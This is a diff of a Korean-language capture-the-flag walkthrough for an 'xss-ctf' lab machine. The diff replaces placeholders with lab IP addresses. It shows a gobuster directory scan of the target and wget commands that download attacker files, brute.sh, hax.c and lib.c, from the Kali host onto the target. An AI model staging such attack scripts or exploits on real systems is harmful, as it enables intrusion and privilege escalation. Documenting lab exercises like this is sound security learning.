@@ -17,7 +17,7 @@ kali firefox에서 http://192.168.56.143 접속	//apache2 기본 페이지
 ## Scan
 
 ```
-gobuster dir -u http://[xss-ctf ip] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,bak
+gobuster dir -u http://192.168.56.143 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,bak
 ```
 /index.php  /index.html  /list.php  /add.php
 
@@ -30,7 +30,9 @@ gobuster dir -u http://[xss-ctf ip] -w /usr/share/wordlists/dirbuster/directory-
 ![Image](https://github.com/user-attachments/assets/aa4d56d4-28ef-4e82-9b66-baba5fad9edc)
 
 /H10000.txt
+
 ![Image](https://github.com/user-attachments/assets/520576de-79c4-4553-8a39-dfd7805ed9fb)
+
 H10000 값
 
 
@@ -49,6 +51,7 @@ M1,M2,M3,M4 값이 중요하기 때문에 복붙
 ![Image](https://github.com/user-attachments/assets/e761c310-7b48-4307-bef6-122f69671eff)
 
 ![Image](https://github.com/user-attachments/assets/47239fa6-b91f-4f44-a8a0-5117113147f2)
+
 
 ## /add.php
 
@@ -146,15 +149,15 @@ kali-root 계정에서 /var/www/html/ 디렉터리에 파일 생성 후, cr0sss1
 
 ![Image](https://github.com/user-attachments/assets/55b9071e-acd5-4125-a93a-0b9bf4691f41)
 ```
-wget http://[kali ip]/brute.sh
+wget http://192.168.56.105/brute.sh
 ```
 ![Image](https://github.com/user-attachments/assets/efbcb372-cd7d-44e4-a68f-a7b37b068949)
 ```
-wget http://[kali ip]/hax.c
+wget http://192.168.56.105/hax.c
 ```
 ![Image](https://github.com/user-attachments/assets/a66c7d11-fd0d-44d6-928b-d18b5c20d8f6)
 ```
-wget http://[kali ip]/lib.c
+wget http://192.168.56.105/lib.c
 ```
 ![Image](https://github.com/user-attachments/assets/1e57f253-9b9a-4791-a059-c80f5fb96e8a)
 
